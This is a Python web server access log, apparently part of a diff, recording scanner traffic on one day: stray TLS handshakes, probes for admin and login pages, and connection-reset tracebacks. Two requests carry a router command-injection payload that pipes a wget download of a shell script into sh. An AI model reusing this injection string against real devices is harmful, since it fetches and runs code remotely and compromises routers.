+----------------------------------------
+87.236.176.2 - - [14/Oct/2026 08:46:03] "GET / HTTP/1.1" 200 -
+45.156.129.54 - - [14/Oct/2026 09:00:52] "GET / HTTP/1.1" 200 -
+205.210.31.64 - - [14/Oct/2026 09:04:17] code 400, message Bad request version ('À\\x13À')
+205.210.31.64 - - [14/Oct/2026 09:04:17] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ë\x9c\x91Æ\x08Pò¾\x0eãEaæ¡\x1c\x1b\x8eQq\x0cw¼l"H\x08\x89Ñó¹;% Ò\x1dBh ¤hE\x9cäÉB\x83rà\x96\x9b6[F\x12#Ùm\x0b|ªÄh8\x81Ö\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+205.210.31.64 - - [14/Oct/2026 09:04:17] code 400, message Bad request version ('À(À$À\\x14À')
+205.210.31.64 - - [14/Oct/2026 09:04:17] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03>¬,\x81Yþ§­\x02$<OA\x1f\x04f\x8fÄ~RwÜ&\x01^ç\x02a\x99´à\x9b\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+5.61.209.106 - - [14/Oct/2026 09:26:04] code 404, message File not found
+5.61.209.106 - - [14/Oct/2026 09:26:04] "GET /SDK/webLanguage HTTP/1.1" 404 -
+221.159.119.6 - - [14/Oct/2026 09:36:50] code 404, message File not found
+221.159.119.6 - - [14/Oct/2026 09:36:50] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 -
+221.159.119.6 - - [14/Oct/2026 09:36:50] code 404, message File not found
+221.159.119.6 - - [14/Oct/2026 09:36:50] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 -
+195.182.16.23 - - [14/Oct/2026 09:46:05] code 404, message File not found
+195.182.16.23 - - [14/Oct/2026 09:46:05] "GET /SDK/webLanguage HTTP/1.1" 404 -
+45.198.224.124 - - [14/Oct/2026 10:09:55] "GET / HTTP/1.1" 200 -
+94.154.43.246 - - [14/Oct/2026 10:12:37] code 404, message File not found
+94.154.43.246 - - [14/Oct/2026 10:12:37] "GET http://api.9hits.com/test HTTP/1.1" 404 -
+35.195.91.156 - - [14/Oct/2026 10:50:25] "GET / HTTP/1.1" 200 -
+34.76.172.140 - - [14/Oct/2026 10:50:31] code 400, message Bad request version ('\\x00/\\x00')
+34.76.172.140 - - [14/Oct/2026 10:50:31] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c§ärandom1random2random3random4\x00\x00\x0c\x00/\x00" 400 -
+34.76.172.140 - - [14/Oct/2026 10:50:31] "GET / HTTP/1.1" 200 -
+34.76.172.140 - - [14/Oct/2026 10:50:39] code 404, message File not found
+34.76.172.140 - - [14/Oct/2026 10:50:39] "GET /favicon.ico HTTP/1.1" 404 -
+5.61.209.106 - - [14/Oct/2026 11:15:35] code 404, message File not found
+5.61.209.106 - - [14/Oct/2026 11:15:35] "GET /SDK/webLanguage HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:16:56] "GET / HTTP/1.0" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('216.180.246.27', 21224)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+216.180.246.27 - - [14/Oct/2026 11:17:28] "GET / HTTP/1.0" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('216.180.246.27', 21224)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+216.180.246.27 - - [14/Oct/2026 11:18:56] code 400, message Bad request version ('À\\x14À')
+216.180.246.27 - - [14/Oct/2026 11:18:56] "\x16\x03\x01\x00ý\x01\x00\x00ù\x03\x03\x89|H¶LKÏÁñ\x12°\x07\x90Ïs¥eócJx^\x08'úZ¬!´\x03ºA \x8d*q\x1fåZ\x92×´ºp/«Êwú|¹ÕÈöæ\x8a°-\x0c\x93¹Èðuå\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+216.180.246.27 - - [14/Oct/2026 11:19:11] "GET / HTTP/1.1" 200 -
+216.180.246.27 - - [14/Oct/2026 11:19:15] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:15] "GET /manage/account/login HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:17] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:17] "GET /admin/index.html HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:18] "GET /index.html HTTP/1.1" 200 -
+216.180.246.27 - - [14/Oct/2026 11:19:20] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:20] "GET /+CSCOE+/logon.html HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:21] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:21] "GET /cgi-bin/login.cgi HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:23] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:23] "GET /login.htm HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:27] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:27] "GET /login.html HTTP/1.1" 404 -
+216.180.246.27 - - [14/Oct/2026 11:19:29] code 404, message File not found
+216.180.246.27 - - [14/Oct/2026 11:19:29] "GET /login.jsp HTTP/1.1" 404 -
